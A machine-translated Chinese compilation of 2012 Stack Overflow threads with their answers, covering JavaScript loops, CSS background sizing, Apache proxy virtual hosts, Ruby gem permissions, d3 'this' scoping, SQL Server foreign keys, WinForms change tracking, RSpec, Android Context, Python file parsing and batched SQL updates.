for (i = 0; i < array.length; i++) {
    if (array[i] > largest) {
        largest = array[i];
    }
}
console.log(largest);​ 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:22:10.233

这条线`largest = array[i];`并不`0 = array[i]`像你相信的那样。`largest`是一个*变量*，因此每次到达该行时`largest = array[i];`，您都*将*的值更改`largest`为当前`array[i]`.

这就是为什么你在最后得到数组的最大值。

一个例子：`a = [1, 3, 7, 2]`

你初始化`largest = 0`. 对于数组的每个元素，您执行以下操作：

```
largest < 1? yes, so largest = 1
largest < 3? yes, so largest = 3
largest < 7? yes, so largest = 7
largest < 2? no, so do nothing 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-31T21:26:47.207

```
var array = [3, 4, 5, 21.15, 21, 9];
var largest = 0;

    for (i=0; i<array.length; i++) {
    if (array[i]>largest) {
        largest = array[i];
    }
}
console.log(largest); 
```

* * *

```
Iteration 1:
Check if array[0] i.e. 3 is greater than 0 => True : largest = 3

Iteration 2:
Check if array[1] i.e. 4 is greater than 3 => True : largest = 4

Iteration 3:
Check if array[2] i.e. 5 is greater than 4 => True : largest = 5

Iteration 4:
Check if array[3] i.e. 21.25 is greater than 5 => True : largest = 21.25

Iteration 5:
Check if array[4] i.e. 21 is greater than 21.25 => False: largest = 21.25

Iteration 6:
Check if array[5] i.e. 9 is greater than 21.25 => False: largest = 21.25 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T21:23:13.417

```
 largest = array[i]; //Assign whatever is at the position 'i' in the array
                     //to the variable 'largest'

 if (array[i]>largest) // See if the value at the position 'i' in the array
                        //is greater than what is contained in the variable 'largest' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-31T21:24:36.677

添加另一个`console.log`语句，它会更清楚。

```
var array = [3, 4, 5, 21.15, 21, 9];
var largest = 0;

    for (i=0; i<array.length; i++) {
    if (array[i]>largest) {
        console.log(largest + " " + array[i]);
        largest = array[i];
    }
}
console.log(largest); 
```

这给出了输出

> 0 3
> 
> 3 4
> 
> 4 5
> 
> 5 21.15
> 
> 21.15

如果`array[i]`大于 的当前值`largest`，则 的值`largest`被 覆盖`array[i]`。它遍历数组，每次都进行比较。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-31T21:32:42.413

> 这将如何神奇地告诉我数组中的最高数字

它不会。因为

```
var largest = 0; 
```

如果数组中的最大值是负数，那么它将虚假地报告`0`为最大值。例如， if `var array = [-3, -4, -5, -21.15, -21, -9];`then`largest`将`0`在循环的末尾，而不是`-3`.

下面应该做得更好，`undefined`如果没有与数组中的数字有意义的可比值，将返回。

```
var greatestIndex = -1;
for (var i = 0, n = array.length; i < n; ++i) {
  if (greatestIndex >= 0 ? array[i] > array[greatestIndex] : array[i] >= -Infinity) {
    greatestIndex = i;
  }
}
return greatestIndex >= 0 ? array[greatestIndex] : undefined; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-04-14T14:21:44.370

如果您将变量“maxNumber”设置为最初等于可能的最低数字并运行“for循环”，在该循环中检查字符串中的每个下一个数字是否高于初始值，然后将输入的当前值改写为它最终将通过将每个当前数字与前一个数字检查并记录最高数字来在数组中运行的初始值。

```
function solve(input) {
    let count = +input.shift();
    let maxNumber = Number.MIN_SAFE_INTEGER;

    for (let i = 0; i <= count; i++) {
        let number = +input.shift();
        if (number > minNumber) {
            mmaxNumber = number;
        }
    }
console.log(maxNumber);
} 
```

# javascript - 全屏标题图片

> ID：13167603
> 
> 赞同：1
> 
> 时间：2012-10-31T21:19:46.317
> 
> 标签：javascript, css, fullscreen

我不会拐弯抹角，而是直接出来问：

[http://www.platetheslate.com/](http://www.platetheslate.com/)

他们做了什么来制作这个图像标题？我使用 chrome 的属性检查器并删除了所有的 javascript 代码和 css，图像仍在拉伸。元素内部的样式随窗口大小而变化。我想有一个事件监听器涉及，但我找不到它。

谁可以给我解释一下这个？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T22:17:28.683

如果你将它作为背景图片，你可以使用非常方便的 CSS3 功能

```
background-size: cover 
```

有关此替代方法的教程，请参阅[具有 CSS3 背景大小的全尺寸背景图像。](http://solemone.de/demos/fullsize-background-image-with-css3-background-size/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:24:08.050

在 css 中复制实际上很容易：

```
​img { min-width: 100%; }​ 
```

这是一个例子：

[http://jsfiddle.net/kZXgW/](http://jsfiddle.net/kZXgW/) - 尝试移动分隔线并看到它伸展。

然后，您可以向父级添加控件以保持高度，或者`max-height`如果您需要垂直约束它。我在您引用的网站上看不到任何真正的诡计，我也看不出有必要。如今，CSS 在这方面做得很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:28:52.887

实际图片的宽度是硬编码的：

# 

```
 <h1 class="title-text"> PLATE THE SLATE No. 6    <em>American      Cheese</em> </h1>
            <div id="h-image"> <img src="http://www.platetheslate.com/wp-content/uploads/2012/10/mfb-american-cheese.jpg" width="1100" height="650" alt="Image" /> </div> 
```

变化的大小是：

```
function resizeText() {

            var topText = $(".title-text");

            var bottomText = $(".title-text em");

            bottomText.css({

                "font-size":getBottomSize(),

                "line-height":getBottomLineHeight()

            }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-01T23:17:41.610

这是创建此功能的 .js 文件。 [http://www.platetheslate.com/wp-content/themes/twentyeleven/js/jquery.main.js](http://www.platetheslate.com/wp-content/themes/twentyeleven/js/jquery.main.js)

它只是一些简单的 jQuery 代码。

# apache - 虚拟主机配置问题？(80, 443, 8080)

> ID：13167604
> 
> 赞同：3
> 
> 时间：2012-10-31T21:19:51.130
> 
> 标签：apache, port, virtualhost

我有一个问题，我似乎无法解决。我用 SSL 设置了 apache 2.2，它就像一个魅力。我将它重定向到 SSL 也没有问题。

在服务器上运行的 java 应用程序使用端口 8080。

我创建了一个虚拟主机（如下），但现在我的 SSL 不起作用。即使我输入“https://hostname/application/etc.jsp”，它也会进入无法显示的屏幕。
注意：如果我输入“http://hostname/application/etc.jsp”（非 ssl），页面会正常显示。

我也试过 <"VirtualHost *:80 *:443"> 还是不行。<"，我知道 " 不应该在那里，但是如果我不把它放在那里，这篇文章将不会在 <...> 中显示任何内容！

```
<"VirtualHost *:80">                           
ServerName Dev-AppSrv
ErrorLog "logs/error.log"
    LogLevel warn
    keepalive Off
    SetEnv proxy-nokeepalive 1

    ProxyPass /learning/ http://Dev-AppSrv:8080/learning/ disablereuse=on retry=0

    ProxyPreserveHost On
    ProxyTimeout 1200
    ProxyPass /plateau/ http://Dev-AppSrv:8080/plateau/ disablereuse=on retry=0
    ProxyPass /help/ http://Dev-AppSrv:8080/help/ disablereuse=on retry=0
    ProxyPass /pqe/ http://Dev-AppSrv:8080/pqe/ disablereuse=on retry=0

</VirtualHost> 
```

# ruby - gem安装数据映射器错误

> ID：13167609
> 
> 赞同：0
> 
> 时间：2012-10-31T21:20:18.477
> 
> 标签：ruby, terminal, gem, datamapper

我正在尝试安装 datamapper，但出现此错误：

```
Whirlwind:Desktop AGreen$ gem install data_mapper
ERROR:  While executing gem ... (Errno::EACCES)
    Permission denied - /Users/AGreen/.rvm/gems/ruby-1.9.2-p320/gems/bcrypt-ruby-3.0.1/.gitignore 
```

我也尝试以这种方式安装它：

```
Whirlwind:Desktop AGreen$ gem install datamapper
ERROR:  While executing gem ... (Errno::EACCES)
    Permission denied - /Users/AGreen/.rvm/gems/ruby-1.9.2-p320/gems/bcrypt-ruby-3.0.1/.gitignore 
```

有谁知道我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-03T14:16:40.960

对我来说似乎是一个权限问题。

去检查：

```
ls -l ~/.rvm 
```

应该都属于你。

修理：

```
sudo chown -R AGreen /Users/AGreen/.rvm 
```

您也可以考虑 chown'ing 整个主目录。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-31T21:24:02.867

如果您使用的是 linux，则需要在命令前加上 sudo。

尝试

```
sudo gem install data_mapper 
```

# assembly - 可执行优化

> ID：13167626
> 
> 赞同：-1
> 
> 时间：2012-10-31T21:21:19.313
> 
> 标签：assembly, compression

有什么方法可以绝对优化汇编程序吗？就像它会删除只使用一次的数据的每一次记忆。它将从实际的大 3d 文件创建像[这样的惊人的 4kb 演示](http://www.youtube.com/watch?v=1YZufDSD3IE)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:57:04.740

不，即使是优化编译器也无法取代这些演示程序员的天才，他们不仅是计算机图形方面的真正专家，而且在编程 CPU 方面也是如此，他们可以从他们身上榨取所有可能的性能。

* * *

注意：汇编文件不是 3d 文件。它们不包含电影等。它们包含用机器代码编写的算法，可在您观看时动态生成（合成）电影。因此，这些演示无法使用 zip、gzip 或 mpeg 等压缩算法进行压缩。优化编译器的效果非常有限。将代码大小减少 30% 的优化器将是一个非常好的优化器。但是你不能指望它将 80KB 的代码减少到 4KB。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:26:52.653

不确定您到底在问什么，但是当空间受到限制时，您可以通过使用[Threaded 代码](http://en.wikipedia.org/wiki/Threaded_code)（包括 Huffman 编码和高度[分解](http://www.ultratechnology.com/Forth-factors.htm)）（这两个传统 Forth 编程的标志）来挤进更多内容。其余的取决于程序员的技能。

# javascript - 为什么“this”变量不是预期值？

> ID：13167630
> 
> 赞同：2
> 
> 时间：2012-10-31T21:22:00.297
> 
> 标签：javascript, d3.js

我对以下代码有疑问。在带有“console.log”的行中，“this”变量应包含“Object Chart”，但包含“path.line”。因此，对 xscale 的引用是未定义的。为什么我会得到这个？在 Chrome 和 Firefox 下会出现此错误。

谢谢你。

```
<!DOCTYPE html>
<html>
<head>
<title>test</title>
<meta charset="utf-8">
<style>
body {
  font: 10px sans-serif;
}

.line {
  fill: none;
  stroke: steelblue;
  stroke-width: 3.0px;
}
</style>
</head>
<body>
<script src="d3.v2.js"></script>
<script>
var kev_vs_rho= [{ 
values: [{x: 0.01, y: 0.2058},{x: 0.03, y: 0.2039},{x: 0.05, y: 0.2020}] }, {
values: [{x: 0.01, y: 1.6468},{x: 0.03, y: 1.6303},{x: 0.05, y: 1.6137}] }, ];
kev_vs_rho.minX=0.01;
kev_vs_rho.maxX=0.99;
kev_vs_rho.minY=0.01;
kev_vs_rho.maxY=33.66;
</script>

<div id="chart1"> </div>
<script>

"use strict";

var Chart = function ( _width, _height, _data, _div ) {
    this.data = _data;
    this.div = _div;

    this.idx1 = 0;
    this.select1 = 0;

    this.margin = {top: 30, right: 30, bottom: 30, left: 80};
    this.width = _width - this.margin.left - this.margin.right;
    this.height = _height - this.margin.top - this.margin.bottom;

    this.xscale = d3.scale.linear()
        .domain([this.data.minX, this.data.maxX])
        .range([0, this.width]);

    this.yscale = d3.scale.linear()
        .domain([this.data.minY, this.data.maxY])
        .range([this.height, 0]);

    this.lineA = d3.svg.line()
        .x(function (d) {
             console.log( this ); // <<== is 'path.line', not object Chart
             console.log( this.xscale ); // <<== undefined

             return this.xscale(d.x); // <<== undefined
             })
        .y(function (d) { return this.yscale(d.y); });

    this.svg1 = d3.select(_div).append("div").append("svg")
        .datum(_data[this.select1].values)
        .attr("width", this.width + this.margin.left + this.margin.right)
        .attr("height", this.height + this.margin.top + this.margin.bottom)
        .append("g")
        .attr("transform", "translate(" + this.margin.left + "," + this.margin.top + ")");

    this.lineB = this.svg1.append("path")
        .attr("class", "line")
        .datum(this.data[this.select1].values)
        .attr("d", this.lineA);
};

var chart1 = new Chart( 960, 400, kev_vs_rho, "#chart1");

</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:37:28.153

除非您`this`直接在 Chart 构造函数中使用（而不是在作为参数传递的匿名函数中）或在 Chart 对象的方法中使用或手动使用[`call`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/call)或[`apply`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/apply)与 Chat 对象一起使用，否则`this`不会引用 Chart 对象。

您可以做的是为图表对象显式设置一个变量并在函数中使用它。

```
<script>

"use strict";

var Chart = function ( _width, _height, _data, _div ) {
    self = this;
    this.data = _data;
    this.div = _div;

    this.idx1 = 0;
    this.select1 = 0;

    this.margin = {top: 30, right: 30, bottom: 30, left: 80};
    this.width = _width - this.margin.left - this.margin.right;
    this.height = _height - this.margin.top - this.margin.bottom;

    this.xscale = d3.scale.linear()
        .domain([this.data.minX, this.data.maxX])
        .range([0, this.width]);

    this.yscale = d3.scale.linear()
        .domain([this.data.minY, this.data.maxY])
        .range([this.height, 0]);

    this.lineA = d3.svg.line()
        .x(function (d) {
             console.log( self ); // <<== is 'path.line', not object Chart
             console.log( self.xscale ); // <<== undefined

             return self.xscale(d.x); // <<== undefined
             })
        .y(function (d) { return self.yscale(d.y); });

    this.svg1 = d3.select(_div).append("div").append("svg")
        .datum(_data[this.select1].values)
        .attr("width", this.width + this.margin.left + this.margin.right)
        .attr("height", this.height + this.margin.top + this.margin.bottom)
        .append("g")
        .attr("transform", "translate(" + this.margin.left + "," + this.margin.top + ")");

    this.lineB = this.svg1.append("path")
        .attr("class", "line")
        .datum(this.data[this.select1].values)
        .attr("d", this.lineA);
};

var chart1 = new Chart( 960, 400, kev_vs_rho, "#chart1");

</script> 
```

# sql-server - 在 SQL Server 中创建一对可选的约束

> ID：13167633
> 
> 赞同：6
> 
> 时间：2012-10-31T21:22:14.223
> 
> 标签：sql-server, sql-server-2008-r2, relationships, table-relationships

我有一个*“主表”*，称之为`Customers`：

```
 CREATE TABLE Customers (
     CustomerID int PRIMARY KEY NOT NULL,
     FirstName nvarchar(50),
     LastName nvarchar(50)
 ) 
```

![在此处输入图像描述](../Images/01955e7f6f70e223b069e999373afc64.png)

我有一个*“卫星表”*，称之为`Customer_IllegallyObtainedInformation`：

```
CREATE TABLE Customer_IllegallyObtainedInformation (
    CustomerID int PRIMARY KEY NOT NULL,
    CellPhonePin int,
    SexualOrientation varchar(20),
    EmailPassword varchar(50)
) 
```

![在此处输入图像描述](../Images/cf577f466a51502b69aec0db30c93ef1.png)

现在，我**想要**的是从`Illegal`表回到主`Customers`表的外键约束：

![在此处输入图像描述](../Images/7c23949f9ebf77b5ea453e006a6cac57.png)

换句话说：

*   **可以**有一个`Customer` **没有***`Illegal`*条目_
*   但**永远不可能没有**一个*`Illegal`*条目`Customer`

我的直觉是，在 SQL Server 数据库图中，将

*   **从**`Illegal`桌子**到**`Customers`桌子_ _

向 SQL Server 表明`Customers_IllegallyObtainedInformation`关系中的“子”。相反，SQL Server 中发生的事情使其成为一对一的关系：

![在此处输入图像描述](../Images/b6baa4605466f26621265eea8451ba6c.png)

这意味着如果您尝试插入 a `Customer`，它将失败，因为没有现有`Illegal`信息。

如何在 SQL Server 中创建*“父子”*或*“一对一”关系？*

* * *

**注意：**不要将示例与问题混淆。我可以在表中创建一个牺牲的主代理键`Illegal`：

![在此处输入图像描述](../Images/42eb0f2f4a883a504424352a713e0031.png)

但这不是我的问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-31T21:32:58.343

似乎设计师正在相反的方向创建外键。

只需自己编写代码：

```
 CREATE TABLE Customers (
         CustomerID int PRIMARY KEY NOT NULL,
         FirstName nvarchar(50),
         LastName nvarchar(50)
     )

    CREATE TABLE Customer_IllegallyObtainedInformation (
        CustomerID int PRIMARY KEY NOT NULL,
        CellPhonePin int,
        SexualOrientation varchar(20),
        EmailPassword varchar(50),

        constraint fk_Customers foreign key (CustomerId) references dbo.Customers
    )

    -- succeeds:
    insert into dbo.Customers
        values(1, 'One', 'One'), (2, 'Two', 'Two')

    --fails:
    insert into dbo.Customer_IllegallyObtainedInformation
        values(3, 1, '', '');

    --succeeds:
    insert into dbo.Customer_IllegallyObtainedInformation
        values(1, 1, '', ''); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-31T21:37:11.170

PRIMARY KEY 可以参与出站 FOREIGN KEY 关系。

```
CREATE TABLE Customer_IllegallyObtainedInformation (
    CustomerID int PRIMARY KEY NOT NULL,
    CellPhonePin int,
    SexualOrientation varchar(20),
    EmailPassword varchar(50)
)
ALTER TABLE Customer_IllegallyObtainedInformation ADD FOREIGN KEY (CustomerId)
        REFERENCES Customer(CustomerId) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-01T09:01:14.073

其他人已经指出如何通过使用 SQL 脚本设置关系来实现您想要的。我想我会添加我的几分钱关于设计师在做什么......

基本上你拖错了方向。

外键本身始终是一对多的。这是一种通知 DBMS 您有一个表（子表）的方法，您希望其中的列（或列的组合）始终对应于另一个表中的键。有了这些信息，DBMS 就可以接管确保子表中的每一行都真正满足这个要求的责任。

通过使列也成为子表中的键，可以使关系事实上是一对一的，但从 DBMS 的角度来看，这并不是关系的真正属性。相反，它只是对可以插入子表的数据的又一限制。

在设计器中创建关系时，似乎有人决定将主键拖到子表中。**因此，当您从Customers_IllegallyObtainedInformation**拖动到**Customers**时，设计器会认为**Customers_IllegallyObtainedInformation**是包含主键的表。

但是等等，为什么它在您引入代理键的第二个示例中起作用？可能是因为制作设计师的人决定让它变得聪明。在这种情况下，您拖动的列不是表中的键。这不能形成关系中的主键，因此设计者检查关系是否可以在相反的方向形成。既然可以，那就是它提供的...

# c# - 当用户尝试关闭 Windows 窗体而不保存时，能够通知用户请求“保存更改”

> ID：13167637
> 
> 赞同：3
> 
> 时间：2012-10-31T21:22:34.457
> 
> 标签：c#, winforms, .net-3.5

我正在使用 C# Windows Forms (.NET 3.5)，并尝试在用户修改 Detail 表单上的任何数据有界列并尝试关闭表单而不保存时实现该功能，系统应该弹出我的消息“保存变化？”。

我知道我总是可以使用`TextChanged`事件`Textbox`等，但这需要多个事件编码。我想使用一个特定的事件处理程序来检测与 my 关联的任何字段中的值变化`BindingSource`。

我已经像这样限制了我的列：

```
textbox1.DataBindings.Add("Text", this.bindingSource1, "dbcolumn_1", true); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T19:46:16.633

像这样的东西会起作用吗？

1.  在表单中定义一个 changedFlag 变量，默认值 = false。

    `private changedFlag = false; // form value(s) changed, check it on form close`

2.  将其放入退出按钮的事件处理程序中，或适应表单关闭处理程序：

    ```
     if (this.changedFlag && MessageBox.Show("Save your changes before exit?", "Save changes?", MessageBoxButtons.OKCancel) == DialogResult.OK)
        {
            this.Save();
        } 
    ```

3.  创建一个函数，该函数接受一个控件容器并递归地查看其控件以连接更改处理程序（在步骤 4 中定义）。

    ```
    private void AddOnChangeHandlerToInputControls(Control ctrl)
    {
        foreach (Control subctrl in ctrl.Controls)
        {
            if (subctrl is TextBox)
            {
                ((TextBox)subctrl).TextChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is CheckBox)
            {
                ((CheckBox)subctrl).CheckedChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is RadioButton)
            {
                ((RadioButton)subctrl).CheckedChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is ListBox)
            {
                ((ListBox)subctrl).SelectedIndexChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is ComboBox)
            {
                ((ComboBox)subctrl).SelectedIndexChanged += new EventHandler(InputControls_OnChange);
            }
            else
            {
                if (subctrl.Controls.Count > 0)
                {
                    this.AddOnChangeHandlerToInputControls(subctrl);
                }
            }
        }
    } 
    ```

4.  创建一个设置 changedFlag = true 的通用更改处理函数

    ```
    private void InputControls_OnChange(object sender, EventArgs e)
    {
        this.changedFlag = true;
    } 
    ```

5.  一旦您的控件被构建（不确定您是否正在动态制作它们，但您`textbox1`在示例中使用了所以我假设不是），从第 3 步调用该函数并传入输入的容器控件。

    `AddOnChangeHandlerToInputControls(panelFormContainer);`

通过传入表单控件的容器，您可以避免手动连接每个控件的更改处理程序。并且记得修改 Save() 函数来重置`changedFlag = false;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:25:29.670

定义 on_closure 事件处理程序； [http://msdn.microsoft.com/en-us/library/system.windows.forms.form.onclosing.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.form.onclosing.aspx)

在那里启动一个表单，询问他们是否要保存并将其作为对话框打开，以便将焦点强制在该表单上（链接中的示例代码显示了如何执行所有这些操作）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-04-05T00:43:23.803

nothingIsNecessary 的答案非常接近，但我仍然需要环顾四周才能使其正常工作。

也就是说，问题是

`AddOnChangeHandlerToInputControls(panelFormContainer);`

应该

`AddOnChangeHandlerToInputControls(this);`

panelFormContainer 不起作用，我也找不到它的文档。

参考：[循环遍历表单上的所有控件，甚至是组框中的控件](https://stackoverflow.com/questions/15186828/loop-through-all-controls-on-a-form-even-those-in-groupboxes)

我还继续根据需要添加了更多控件类型。我将 MouseCaptureChanged 用于 datePicker，因为复选框有时会触发 ValueChanged，有时不会。¯_(ツ)_/¯

```
private void AddOnChangeHandlerToInputControls(Control ctrl) 
    {
        foreach (Control subctrl in ctrl.Controls)
        {
            if (subctrl is TextBox)
            {
                ((TextBox)subctrl).TextChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is CheckBox)
            {
                ((CheckBox)subctrl).CheckedChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is RadioButton)
            {
                ((RadioButton)subctrl).CheckedChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is ListBox)
            {
                ((ListBox)subctrl).SelectedIndexChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is ComboBox)
            {
                ((ComboBox)subctrl).SelectedIndexChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is MaskedTextBox)
            {
                ((MaskedTextBox)subctrl).TextChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is DateTimePicker)
            {
                ((DateTimePicker)subctrl).MouseCaptureChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is RichTextBox)
            {
                ((RichTextBox)subctrl).TextChanged += new EventHandler(InputControls_OnChange);
            }
            else if (subctrl is NumericUpDown)
            {
                ((NumericUpDown)subctrl).TextChanged += new EventHandler(InputControls_OnChange);
            }
            else
            {
                if (subctrl.Controls.Count > 0)
                {
                    this.AddOnChangeHandlerToInputControls(subctrl);
                }
            }
        }
    } 
```

# ruby-on-rails - RSpec 测试是否所有模型都 response_to 属性

> ID：13167638
> 
> 赞同：2
> 
> 时间：2012-10-31T21:22:41.060
> 
> 标签：ruby-on-rails, ruby-on-rails-3, unit-testing, rspec

我正在尝试为看似相对简单的测试编写 RSpec 测试，但事实证明它非常棘手（尽管我是 RSpec 新手）。

简单来说，我想测试我的应用程序中的所有模型都响应：所有者或：所有者。

我的第一个问题是遍历所有模型——如何在 RSpec 中做到这一点？我通常可以遍历模型，例如：

```
ActiveRecord::Base.descendants.each { |model|
    model.should respond_to :owner
} 
```

但不确定如何在 RSpec 中正确执行此操作？我找不到太多关于在测试中使用循环的文档。

我的第二个问题是关于“OR”子句的——如何实现“对所有者或所有者的响应”？就像是：

```
model.should respond_to :owner || :owners 
```

但同样我找不到太多关于 using or 子句的文档。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-01T00:54:50.793

您可以通过测试每种方法并汇总答案来完成 OR 条件：

```
ActiveRecord::Base.descendants.each do |model|
   instance = model.new
   expected = instance.respond_to?(:owner) || instance.respond_to?(:owners)
   expected.should be_true
end 
```

但这对我来说是错误的。如果模型只响应 和 之一`:owner`，`:owners`您应该测试它是否响应正确的一个。即使这意味着为每个模型创建一个规范（无论如何你都应该有）并添加一个新的例子，从长远来看，你最好是具体的。它还可以帮助您的代码的未来维护者，他们希望模型规范位于模型本身的规范文件中，而不是在包罗万象的规范中。

在这种情况下，示例非常小——对于较长的示例，您可能会考虑使用[共享示例](https://www.relishapp.com/rspec/rspec-core/v/2-11/docs/example-groups/shared-examples)来稍微干燥一下。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:43:45.910

当您运行 Rspec 测试时，您仍在使用 Ruby。所以你的循环应该可以工作，只要你在一个`it`块中。您唯一的问题是您有一个模型对象而不是该对象的实例，因此您需要创建一个。所以一种解决方案是：

```
it "every model should respond to owners" do

  ActiveRecord::Base.descendants.each { |model|
   model.new.should respond_to :owner
  }

end 
```

我不确定 or 子句。

# java - 如何从 ImageView 中获取上下文

> ID：13167654
> 
> 赞同：0
> 
> 时间：2012-10-31T21:24:06.630
> 
> 标签：java, android, touch

我正在尝试使 ImageView 成为我可以用手指在上面绘制的表面。

我遵循了[Android 2D Graphics Example](http://marakana.com/s/android_2d_graphics_example,1036/index.html)，这导致整个屏幕可绘制（有一些问题，在问题[8287949](https://stackoverflow.com/questions/8287949/android-how-to-draw-a-smooth-line-following-your-finger)中讨论过，但与我正在尝试做的事情有些脱节。）

我正在与：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceStatA);
    // getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
    // requestWindowFeature(Window.FEATURE_NO_TITLE);
    drawView = new DrawView(this);
    drawView.requestFocus();
    setContentView(R.layout.activity_main);
} 
```

我想我需要更改`drawView = new DrawView(this)`为引用我在中定义的资源的上下文的东西`activity_main.xml`：

```
ImageView
    android:id="@+id/canvasview"
    android:layout_width="match_parent"
    android:layout_height="300dp"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/btnRed"
    android:background="@drawable/kitty" 
```

但是，我要么不知道我在 API 参考中寻找什么，要么我没有找到它。

DrawView 的类在[Android 2D Graphics Example](http://marakana.com/s/android_2d_graphics_example,1036/index.html)中有说明，这里不再赘述。

我一直在通过 AppInventor 工作，并尝试使用真正的 Android SDK 复制我在 Eclipse 中学到的东西，但我对教程 #1 感到困惑，对于新手的问题，我感到很抱歉！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:39:31.273

`Context`用于创建的实际上`View`是，`Activity`所以它已经分配给`this`参考。它在您调用时设置`setContentView()`。

另外，[View#getContext()](http://developer.android.com/reference/android/view/View.html#getContext%28%29)。

因此，要检索`Context`您将获得对 View 的引用，然后调用`getContext()`. 在这种特定情况下，它将是

```
ImageView img = (ImageView) findViewById(R.id.canvasview);
Context c = img.getContext(); 
```

# python - python将文本文件读入数组

> ID：13167662
> 
> 赞同：0
> 
> 时间：2012-10-31T21:24:57.603
> 
> 标签：python

我正在尝试使用 Python 自动解析一组文本文件并将它们转换为 XML 文件。

有很多人问如何遍历文本文件并将它们读入数组。这里的问题是这对我来说不太适用。

我需要分别循环遍历前三行，然后将文本文件（正文）的其余部分放入一个数组条目中。

文本文件的格式如下。

> 标题
> 
> 副标题
> 
> 由一个人
> 
> 文本文件正文内容。多个段落

我将如何在 Python 中设置一个数组来执行此操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:33:03.593

像这样的东西：

```
with open("data1.txt") as f:
    head,sub,auth = [f.readline().strip() for i in range(3)]
    data=f.read()
    print head,sub,auth,data 
```

如果行之间有空格，那么您应该尝试：

`filter()`将删除他的空行：

```
 with open("data1.txt") as f:
    head,sub,auth =filter(None,(f.readline().strip() for i in range(6)))
    data=f.read()
    print head,sub,auth,,data 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:29:39.483

如果我正确理解了您的问题，您希望将除前 3 行之外的所有文本放入一个数组（列表）中。以下是如何做到这一点：

```
with open("/path/to/your/file.txt") as f:
    all_lines = f.readlines()
content_lines = all_lines[3:]
content_text = '\n'.join(content_lines)
content_list.append(content_text) 
```

**说明：**您首先打开文件，然后将其所有行放入一个列表中。然后，您将前三行之后的所有行放入列表中。然后，您使用换行符加入这个新列表以使其再次成为内容。然后，将此新内容附加到您事先创建的名为`content_list`

* * *

如果您也想将前三行放入列表中，请在附加到之前执行以下操作`content_list`：

```
for line in all_lines[:3]:
    content_list.append(line) 
```

# php - Sql更新大量行

> ID：13167665
> 
> 赞同：1
> 
> 时间：2012-10-31T21:25:13.603
> 
> 标签：php, mysql, sql

我需要更新大量行，比如 100,000 行。一个查询可能对服务器来说太重了。

拆分更新的最佳方法是什么？像更新 200 行，睡一秒，然后再更新 200 行。

编辑：

好的，我得到了一个答案，可以在一个查询中执行此操作。但我仍然想知道如何做到这一点。假设我有 1,000,000 行或更多行。拆分查询的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:41:30.760

除非有您没有告诉我们的限制，否则在一个查询中更新所有内容是最好的解决方案。

由于服务器过载而考虑拆分东西似乎没有真正的用处。想想你自己的解决方案和数字。如果您有 100 万个数据集，并且您尝试一次更新 200 个数据集，然后休眠一秒钟，您最终会进行 5000 次更新并花费 83.3 分钟等待服务器完成此任务，这还不包括它所花费的时间执行查询，这可能非常快。

本质上，您会知道或选择数据库中的所有 ID，并通过在 UPDATE 中使用适当的 WHERE 子句来为每个 ID 或组发送查询。

除非我们对场景有更多了解，否则无法回答这个问题。它处理针对非常个性化的使用模式的优化东西，并且没有解决方案可以在任何地方应用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:27:08.963

使用 Limit 和 ORDER BY last_updated_time ASC 的组合...

有点像...

```
UPDATE table SET ..... ORDER BY last_updated_time ASC LIMIT 5000 
```

5000 更新通常不会太严重.. 如果您想将其设置为 1000..

# java - 如何在其他北方的盒子布局中添加组件并使它们都锚定在南方？

> ID：13167669
> 
> 赞同：0
> 
> 时间：2012-10-31T21:25:39.970
> 
> 标签：java, swing, jpanel, layout-manager, boxlayout

我尝试制作一个非常迷你的游戏。

